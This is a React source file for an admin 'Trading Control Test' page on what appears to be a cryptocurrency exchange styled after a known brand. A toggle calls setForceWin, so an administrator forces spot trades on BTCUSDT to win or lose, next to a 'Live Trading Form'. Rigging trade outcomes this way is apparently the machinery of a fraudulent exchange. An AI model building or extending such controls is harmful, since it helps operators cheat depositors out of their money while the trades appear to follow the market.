import React, { useState } from 'react';
import { Card } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { toast } from '@/components/ui/use-toast';
import { tradingApiService, adminControlService } from '@/services/tradingApiService';
import { AdminTradingControl } from '@/components/admin/AdminTradingControl';
import { SpotTradeForm } from '@/components/trading/SpotTradeForm';
import { Badge } from '@/components/ui/badge';
import { Crown, TrendingUp, TrendingDown, Play, Settings } from 'lucide-react';

export const TradingTestPage: React.FC = () => {
  const [currentMode, setCurrentMode] = useState<'win' | 'loss'>('loss');
  const [testResults, setTestResults] = useState<any[]>([]);
  const [loading, setLoading] = useState(false);

  const runQuickTest = async () => {
    setLoading(true);
    try {
      const response = await tradingApiService.executeSpotTrade({
        pair: 'BTCUSDT',
        side: 'buy',
        type: 'market',
        amount: 0.001,
        price: 67668.18,
        total: 67
      });

      const result = {
        id: response.trade.id,
        timestamp: new Date().toISOString(),
        outcome: response.trade.outcome,
        pnl: response.trade.pnl,
        message: response.trade.message
      };

      setTestResults(prev => [result, ...prev.slice(0, 4)]); // Keep last 5 results

      toast({
        title: `Trade ${response.trade.outcome.toUpperCase()}`,
        description: `PnL: $${response.trade.pnl.toFixed(2)}`,
        variant: response.trade.outcome === 'win' ? 'default' : 'destructive'
      });

    } catch (error) {
      console.error('Test failed:', error);
      toast({
        title: "Test Failed",
        description: "Trade execution failed",
        variant: "destructive"
      });
    } finally {
      setLoading(false);
    }
  };

  const toggleMode = async () => {
    try {
      const newMode = currentMode === 'win' ? false : true;
      await adminControlService.setForceWin(newMode);
      setCurrentMode(newMode ? 'win' : 'loss');
      
      toast({
        title: `Mode Changed`,
        description: `Now in ${newMode ? 'WIN' : 'LOSS'} mode`,
        variant: newMode ? 'default' : 'destructive'
      });
    } catch (error) {
      console.error('Failed to toggle mode:', error);
    }
  };

  return (
    <div className="min-h-screen bg-[#181A20] p-6">
      <div className="max-w-7xl mx-auto space-y-6">
        {/* Header */}
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-3xl font-bold text-[#EAECEF] mb-2">
              Trading Control Test
            </h1>
            <p className="text-[#848E9C]">
              Test admin control over trade outcomes
            </p>
          </div>
          <div className="flex items-center gap-3">
            <Badge 
              className={`px-3 py-1 ${
                currentMode === 'win' 
                  ? 'bg-green-500/20 text-green-400 border-green-500/30' 
                  : 'bg-red-500/20 text-red-400 border-red-500/30'
              }`}
            >
              {currentMode === 'win' ? (
                <TrendingUp className="w-3 h-3 mr-1" />
              ) : (
                <TrendingDown className="w-3 h-3 mr-1" />
              )}
              {currentMode.toUpperCase()} MODE
            </Badge>
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Admin Control Panel */}
          <div className="lg:col-span-1">
            <AdminTradingControl />
          </div>

          {/* Test Area */}
          <div className="lg:col-span-2 space-y-6">
            {/* Quick Test */}
            <Card className="bg-[#1E2329] border-[#2B3139] p-6">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-lg font-semibold text-[#EAECEF] flex items-center gap-2">
                  <Play className="h-5 w-5 text-[#F0B90B]" />
                  Quick Trade Test
                </h2>
                <Button
                  onClick={toggleMode}
                  variant="outline"
                  size="sm"
                  className="border-[#2B3139] text-[#848E9C]"
                >
                  <Settings className="h-4 w-4 mr-2" />
                  Toggle Mode
                </Button>
              </div>

              <div className="space-y-4">
                <div className="p-4 bg-[#181A20] rounded-lg">
                  <p className="text-sm text-[#848E9C] mb-2">
                    Test Trade Details:
                  </p>
                  <div className="grid grid-cols-2 gap-2 text-sm">
                    <div>
                      <span className="text-[#848E9C]">Pair:</span>
                      <span className="ml-2 text-[#EAECEF]">BTCUSDT</span>
                    </div>
                    <div>
                      <span className="text-[#848E9C]">Amount:</span>
                      <span className="ml-2 text-[#EAECEF]">0.001 BTC</span>
                    </div>
                    <div>
                      <span className="text-[#848E9C]">Price:</span>
                      <span className="ml-2 text-[#EAECEF]">$67,000</span>
                    </div>
                    <div>
                      <span className="text-[#848E9C]">Total:</span>
                      <span className="ml-2 text-[#EAECEF]">$67.00</span>
                    </div>
                  </div>
                </div>

                <Button
                  onClick={runQuickTest}
                  disabled={loading}
                  className={`w-full ${
                    currentMode === 'win' 
                      ? 'bg-green-500 hover:bg-green-600' 
                      : 'bg-red-500 hover:bg-red-600'
                  } text-white`}
                >
                  {loading ? 'Executing...' : `Execute Test Trade (${currentMode.toUpperCase()})`}
                </Button>
              </div>
            </Card>

            {/* Test Results */}
            {testResults.length > 0 && (
              <Card className="bg-[#1E2329] border-[#2B3139] p-6">
                <h2 className="text-lg font-semibold text-[#EAECEF] mb-4">
                  Recent Test Results
                </h2>
                <div className="space-y-3">
                  {testResults.map((result, index) => (
                    <div
                      key={result.id}
                      className={`p-3 rounded-lg border ${
                        result.outcome === 'win'
                          ? 'bg-green-500/10 border-green-500/30'
                          : 'bg-red-500/10 border-red-500/30'
                      }`}
                    >
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          {result.outcome === 'win' ? (
                            <TrendingUp className="h-4 w-4 text-green-400" />
                          ) : (
                            <TrendingDown className="h-4 w-4 text-red-400" />
                          )}
                          <span className={`font-semibold ${
                            result.outcome === 'win' ? 'text-green-400' : 'text-red-400'
                          }`}>
                            {result.outcome.toUpperCase()}
                          </span>
                        </div>
                        <div className="text-right">
                          <p className={`font-semibold ${
                            result.outcome === 'win' ? 'text-green-400' : 'text-red-400'
                          }`}>
                            {result.pnl >= 0 ? '+' : ''}${result.pnl.toFixed(2)}
                          </p>
                          <p className="text-xs text-[#848E9C]">
                            {new Date(result.timestamp).toLocaleTimeString()}
                          </p>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </Card>
            )}

            {/* Live Trading Form */}
            <Card className="bg-[#1E2329] border-[#F0B90B] p-6">
              <h2 className="text-lg font-semibold text-[#EAECEF] mb-4 flex items-center gap-2">
                <Crown className="h-5 w-5 text-[#F0B90B]" />
                Live Trading Form
              </h2>
              <SpotTradeForm symbol="BTCUSDT" />
            </Card>
          </div>
        </div>
      </div>
    </div>
  );
};
